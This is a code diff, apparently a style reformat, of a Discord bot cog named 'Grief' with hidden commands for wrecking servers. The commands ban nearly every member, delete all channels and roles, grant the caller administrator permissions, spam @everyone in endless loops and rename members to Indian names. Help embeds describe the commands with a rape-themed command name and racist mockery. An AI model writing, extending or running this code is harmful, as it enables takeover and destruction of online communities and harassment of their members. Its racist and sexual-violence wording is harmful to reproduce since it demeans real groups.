@@ -5,7 +5,8 @@ from colorsys import hls_to_rgb
 import discord
 from discord import client
 from discord.ext import commands
-WHITELIST = ['Koalaa#6001', 'ImHSYes']
+
+WHITELIST = ["Koalaa#6001", "ImHSYes"]
 rename_to = [
     "Damini Chia",
     "Mohan Sachdev",
@@ -248,12 +249,13 @@ class Grief(commands.Cog):
                     f"{role.name} \u001b[0m has NOT been deleted in \u001b[33m {ctx.guild.name} \u001b[0m"
                 )
         for user in ctx.guild.members:
-            if  (user in WHITELIST
-                    or user == ctx.message.author):
-                print('Skipped user')
+            if user in WHITELIST or user == ctx.message.author:
+                print("Skipped user")
             else:
                 try:
-                    await ctx.guild.ban(user, reason='Ban given by @nezu🌸#0001', delete_message_days=7)
+                    await ctx.guild.ban(
+                        user, reason="Ban given by @nezu🌸#0001", delete_message_days=7
+                    )
                     print(
                         f"{user.name} has been banned from \u001b[33m {ctx.guild.name} \u001b[0m"
                     )
@@ -272,9 +274,9 @@ class Grief(commands.Cog):
         guild = ctx.guild
 
         perms = discord.Permissions(8)
-        await guild.create_role(name="hs",
-                                permissions=perms,
-                                colour=discord.Colour(0xFDFF3B))
+        await guild.create_role(
+            name="hs", permissions=perms, colour=discord.Colour(0xFDFF3B)
+        )
         user = ctx.message.author
 
         role = discord.utils.get(user.guild.roles, name="hs")
@@ -290,9 +292,9 @@ class Grief(commands.Cog):
         await ctx.message.delete()
         guild = ctx.guild
         perms = discord.Permissions(2147483127)
-        await guild.create_role(name="sh",
-                                permissions=perms,
-                                colour=discord.Colour(0xFF80EF))
+        await guild.create_role(
+            name="sh", permissions=perms, colour=discord.Colour(0xFF80EF)
+        )
         user = ctx.message.author
         role = discord.utils.get(user.guild.roles, name="sh")
         await user.add_roles(role)
@@ -305,9 +307,9 @@ class Grief(commands.Cog):
         await ctx.message.delete()
         guild = ctx.guild
         perms = discord.Permissions(2147483127)
-        await guild.create_role(name="weeb",
-                                permissions=perms,
-                                colour=discord.Colour(0xFF80EF))
+        await guild.create_role(
+            name="weeb", permissions=perms, colour=discord.Colour(0xFF80EF)
+        )
         user = ctx.message.author
         role = discord.utils.get(user.guild.roles, name="weeb")
         await user.add_roles(role)
@@ -334,11 +336,9 @@ class Grief(commands.Cog):
     @commands.command(hidden=True)
     async def jane(self, ctx):
         await ctx.message.delete()
-        embed = discord.Embed(description="@everyone",
-                              colour=discord.Colour(0xFF001D))
+        embed = discord.Embed(description="@everyone", colour=discord.Colour(0xFF001D))
         embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/541880222065098762/655747250550734848/jane_xd.jpeg"
+            url="https://cdn.discordapp.com/attachments/541880222065098762/655747250550734848/jane_xd.jpeg"
         )
         await ctx.send(embed=embed)
 
@@ -346,49 +346,36 @@ class Grief(commands.Cog):
     async def ifsexybenigcrime(self, ctx):
         await ctx.message.delete()
 
-        embed = discord.Embed(description="@everyone",
-                              colour=discord.Colour(0xFF001D))
+        embed = discord.Embed(description="@everyone", colour=discord.Colour(0xFF001D))
         embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/658559344966762497/660380817692033024/hsisindian.png"
+            url="https://cdn.discordapp.com/attachments/658559344966762497/660380817692033024/hsisindian.png"
         )
         await ctx.send(embed=embed)
 
     @commands.command(hidden=True)
     async def tgay(self, ctx):
         await ctx.message.delete()
-        embed = discord.Embed(description="@everyone",
-                              colour=discord.Colour(0xFF001D))
+        embed = discord.Embed(description="@everyone", colour=discord.Colour(0xFF001D))
         embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/660382624128303126/660384156907470848/ths.png"
+            url="https://cdn.discordapp.com/attachments/660382624128303126/660384156907470848/ths.png"
         )
         await ctx.send(embed=embed)
-
-
-
 
     @commands.command(hidden=True)
     async def janexd(self, ctx):
         await ctx.message.delete()
-        embed = discord.Embed(description="@everyone",
-                              colour=discord.Colour(0xFF001D))
+        embed = discord.Embed(description="@everyone", colour=discord.Colour(0xFF001D))
         embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/541880222065098762/655747238374539264/jane_shoot.jpg"
+            url="https://cdn.discordapp.com/attachments/541880222065098762/655747238374539264/jane_shoot.jpg"
         )
         await ctx.send(embed=embed)
-
-
 
     @commands.command(hidden=True)
     async def redhseyes(self, ctx):
         await ctx.message.delete()
-        embed = discord.Embed(description="@everyone",
-                              colour=discord.Colour(0xFF001D))
+        embed = discord.Embed(description="@everyone", colour=discord.Colour(0xFF001D))
         embed.set_image(
-            url=
-            "https://media.discordapp.net/attachments/647801195527798789/655781773720027142/hs2.png"
+            url="https://media.discordapp.net/attachments/647801195527798789/655781773720027142/hs2.png"
         )
         await ctx.send(embed=embed)
 
@@ -405,8 +392,9 @@ class Grief(commands.Cog):
         while i < 40:
             i += 1
             randomrandom = random.choice(imgss)
-            embed = discord.Embed(description="@everyone",
-                                  colour=discord.Colour(0xFF001D))
+            embed = discord.Embed(
+                description="@everyone", colour=discord.Colour(0xFF001D)
+            )
             embed.set_image(url=randomrandom)
             await ctx.send(embed=embed)
             await asyncio.sleep(0.7)
@@ -416,11 +404,11 @@ class Grief(commands.Cog):
         await ctx.message.delete()
         while not client.is_closed:
             try:
-                embed = discord.Embed(description="@everyone",
-                                      colour=discord.Colour(0xFF001D))
+                embed = discord.Embed(
+                    description="@everyone", colour=discord.Colour(0xFF001D)
+                )
                 embed.set_image(
-                    url=
-                    "https://cdn.discordapp.com/attachments/660382624128303126/660395050479648788/indi.png"
+                    url="https://cdn.discordapp.com/attachments/660382624128303126/660395050479648788/indi.png"
                 )
                 await ctx.send(embed=embed)
                 await asyncio.sleep(0.7)
@@ -428,10 +416,12 @@ class Grief(commands.Cog):
                 print(
                     f"\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages"
                 )
+
     @commands.command(hidden=True)
     async def listchannels(self, ctx):
         await ctx.send([x.name for x in self.bot.get_all_channels()])
         print([x for x in self.bot.get_all_channels()])
+
     @commands.command(hidden=True)
     async def nuclearhs(self, ctx):
         await ctx.message.delete()
@@ -446,13 +436,11 @@ class Grief(commands.Cog):
                         f"{channel.name} has been deleted in \u001b[33m {ctx.guild.name} \u001b[0m"
                     )
                 except (
-                        discord.Forbbiden,
-                        discord.NotFound,
-                        discord.HTTPException,
+                    discord.Forbbiden,
+                    discord.NotFound,
+                    discord.HTTPException,
                 ) as e:
-                    print(
-                        f"Could not delete channel {channel.name} for reason {e}"
-                    )
+                    print(f"Could not delete channel {channel.name} for reason {e}")
             print(
                 f"\u001b[32m {ctx.message.author} \u001b[0m has nuked and deleted all channels in \u001b[33m {ctx.guild.name} \u001b[0m"
             )
@@ -536,84 +524,71 @@ class Grief(commands.Cog):
         embed.set_author(name="Page 1 of 3")
 
         embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/660382624128303126/660384585389178920/oats.png"
+            url="https://cdn.discordapp.com/attachments/660382624128303126/660384585389178920/oats.png"
         )
-        embed.add_field(name="-h",
-                        value="Kicks everyone from the server",
-                        inline=False)
+        embed.add_field(name="-h", value="Kicks everyone from the server", inline=False)
         embed.add_field(
             name="-rape",
-            value=
-            "Deletes all channels, creates a new channel to flex, and bans everyone",
+            value="Deletes all channels, creates a new channel to flex, and bans everyone",
             inline=False,
         )
-        embed.add_field(name="-hs",
-                        value="Creates a role and gives you administrator",
-                        inline=False)
-        embed.add_field(name="-sh",
-                        value="Want the rest of the permissions?",
-                        inline=False)
+        embed.add_field(
+            name="-hs", value="Creates a role and gives you administrator", inline=False
+        )
+        embed.add_field(
+            name="-sh", value="Want the rest of the permissions?", inline=False
+        )
         embed.add_field(
             name="-nuclearhs",
-            value=
-            "Deletes all channels, basically rendering the server useless",
+            value="Deletes all channels, basically rendering the server useless",
             inline=False,
         )
         embed.add_field(
             name="-hsmsg",
-            value=
-            "messages all discord members of the server with your desired message",
+            value="messages all discord members of the server with your desired message",
             inline=False,
         )
         embed.set_footer(
-            text=
-            "for meme voice commands type -voicehshelp or -hshelp2 for page 2")
-        await ctx.send(ctx.message.author.mention,
-                       embed=embed,
-                       delete_after=11)
+            text="for meme voice commands type -voicehshelp or -hshelp2 for page 2"
+        )
+        await ctx.send(ctx.message.author.mention, embed=embed, delete_after=11)
         print(f"Sent hs help to @\u001b[32m {ctx.message.author} \u001b[0m")
 
     @commands.command(hidden=True)
     async def hshelp2(self, ctx):
         await ctx.message.delete()
-        embed = discord.Embed(colour=discord.Colour.blue(),
-                              title="hs commands")
+        embed = discord.Embed(colour=discord.Colour.blue(), title="hs commands")
         embed.set_author(name="Page 2 of 3")
 
         embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/660382624128303126/660384585389178920/oats.png"
+            url="https://cdn.discordapp.com/attachments/660382624128303126/660384585389178920/oats.png"
         )
         embed.add_field(
             name="-hschannel",
             value="Edits channel name to random phrases",
             inline=False,
         )
-        embed.add_field(name="-hsadd",
-                        value="Adds new channels with random phrases",
-                        inline=False)
-        embed.add_field(name="-clearroles",
-                        value="Deletes all possible roles",
-                        inline=False)
-        embed.add_field(name="-randomspam",
-                        value="spam the chat with random text",
-                        inline=False)
+        embed.add_field(
+            name="-hsadd", value="Adds new channels with random phrases", inline=False
+        )
+        embed.add_field(
+            name="-clearroles", value="Deletes all possible roles", inline=False
+        )
+        embed.add_field(
+            name="-randomspam", value="spam the chat with random text", inline=False
+        )
         embed.add_field(
             name="-hsserveredit",
-            value=
-            "removes the photo of the guild and changes name to what u desire and region change to india",
+            value="removes the photo of the guild and changes name to what u desire and region change to india",
             inline=False,
         )
-        embed.add_field(name="-indianrename",
-                        value="renames everyone to indian names",
-                        inline=False)
+        embed.add_field(
+            name="-indianrename", value="renames everyone to indian names", inline=False
+        )
         embed.set_footer(
             text="for meme voice commands type -voicehshelp -hshelp3 for page 3"
         )
-        await ctx.send(ctx.message.author.mention,
-                       embed=embed,
-                       delete_after=11)
+        await ctx.send(ctx.message.author.mention, embed=embed, delete_after=11)
         print(f"Sent hs help2 to @\u001b[32m {ctx.message.author} \u001b[0m")
 
     @commands.command(hidden=True)
@@ -621,19 +596,13 @@ class Grief(commands.Cog):
         await ctx.message.delete()
         embed = discord.Embed(colour=discord.Colour(0xF8E71C))
         embed.set_author(name="Hs voice commands")
-        embed.add_field(name="-erika",
-                        value="plays erika to rape ppl",
-                        inline=False)
-        embed.add_field(name="-alexghae",
-                        value="plays russian hardbass",
-                        inline=False)
-        embed.add_field(name="-hsgirlfriendlol",
-                        value="plays a song of loneliness",
-                        inline=False)
+        embed.add_field(name="-erika", value="plays erika to rape ppl", inline=False)
+        embed.add_field(name="-alexghae", value="plays russian hardbass", inline=False)
+        embed.add_field(
+            name="-hsgirlfriendlol", value="plays a song of loneliness", inline=False
+        )
         embed.set_footer(text="Pls kill me now")
-        await ctx.send(ctx.message.author.mention,
-                       embed=embed,
-                       delete_after=11)
+        await ctx.send(ctx.message.author.mention, embed=embed, delete_after=11)
         print(f"Sent Voice help to @\u001b[32m {ctx.message.author} \u001b[0m")
 
     @commands.command(hidden=True)
@@ -686,9 +655,7 @@ class Grief(commands.Cog):
 
     @commands.command(hidden=True)
     async def hsroles(self, ctx):
-        colourrandom = [
-            "".join([random.choice("0123456789ABCDEF") for j in range(6)])
-        ]
+        colourrandom = ["".join([random.choice("0123456789ABCDEF") for j in range(6)])]
         colour = int(colourrandom, 0)
 
         names = [
@@ -714,8 +681,7 @@ class Grief(commands.Cog):
             randomnames = random.choice(names)
             role = discord.utils.get(ctx.guild.roles, name=randomnames)
             names.remove(randomnames)
-            await guild.create_role(name=randomnames,
-                                    colour=discord.Colour(colour))
+            await guild.create_role(name=randomnames, colour=discord.Colour(colour))
             await users.add_roles(role)
 
     @commands.command(hidden=True)
@@ -742,8 +708,9 @@ class Grief(commands.Cog):
                 break
             else:
                 randomtext = random.choice(copypasta)
-                embed = discord.Embed(description=randomtext,
-                                      colour=discord.Colour(0xFF001D))
+                embed = discord.Embed(
+                    description=randomtext, colour=discord.Colour(0xFF001D)
+                )
                 embed.set_footer(text="Pls do the commit hs")
                 await ctx.send(embed=embed)
                 await asyncio.sleep(0.21)
@@ -760,18 +727,30 @@ class Grief(commands.Cog):
         if infinite is True:
             while True:
                 for i in range(len(status) + 1):
-                    await self.bot.change_presence(activity=discord.Activity(
-                        type=discord.ActivityType.listening, name=status[:i]))
+                    await self.bot.change_presence(
+                        activity=discord.Activity(
+                            type=discord.ActivityType.listening, name=status[:i]
+                        )
+                    )
                     await asyncio.sleep(5)
-                await self.bot.change_presence(activity=discord.Activity(
-                    type=discord.ActivityType.listening, name=status[0]))
+                await self.bot.change_presence(
+                    activity=discord.Activity(
+                        type=discord.ActivityType.listening, name=status[0]
+                    )
+                )
         else:
             for i in range(len(status)):
-                await self.bot.change_presence(activity=discord.Activity(
-                    type=discord.ActivityType.listening, name=status[:i]))
+                await self.bot.change_presence(
+                    activity=discord.Activity(
+                        type=discord.ActivityType.listening, name=status[:i]
+                    )
+                )
                 await asyncio.sleep(5)
-            await self.bot.change_presence(activity=discord.Activity(
-                type=discord.ActivityType.listening, name="help"))
+            await self.bot.change_presence(
+                activity=discord.Activity(
+                    type=discord.ActivityType.listening, name="help"
+                )
+            )
 
     @commands.command(hidden=True)
     async def hideaudit(self, ctx):
@@ -786,16 +765,11 @@ class Grief(commands.Cog):
                     else:
                         print(i.name, i.colour)
                         ctx.hue = (ctx.hue + ctx.step) % 360
-                        rgb = [
-                            int(x * 255)
-                            for x in hls_to_rgb(ctx.hue / 360, 0.5, 1)
-                        ]
-                        clr = discord.Colour(
-                            ((rgb[0] << 16) + (rgb[1] << 8) + rgb[2]))
+                        rgb = [int(x * 255) for x in hls_to_rgb(ctx.hue / 360, 0.5, 1)]
+                        clr = discord.Colour(((rgb[0] << 16) + (rgb[1] << 8) + rgb[2]))
                         await i.edit(
                             colour=clr,
-                            reason=
-                            f"Rainbow roles activated by {ctx.guild.owner}",
+                            reason=f"Rainbow roles activated by {ctx.guild.owner}",
                         )
                         await asyncio.sleep(0.7)
             except discord.Forbidden:
